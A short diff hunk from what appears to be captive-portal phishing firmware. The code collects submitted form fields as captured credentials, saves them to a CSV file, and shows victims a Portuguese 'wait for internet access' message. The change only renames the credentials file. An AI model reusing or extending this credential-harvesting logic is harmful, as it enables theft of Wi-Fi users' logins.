@@ -37,7 +37,7 @@ void handleCreds() {
         last_cred += ep->argName(i).substring(0,3) + ": " + ep->arg(i) + "\n";
       }
       html_temp += "</li>\n";
-      saveToCSV("/Bruce_creds.csv", csvLine);
+      saveToCSV("/webug_creds.csv", csvLine);
       capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
       totalCapturedCredentials++;
       ep->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
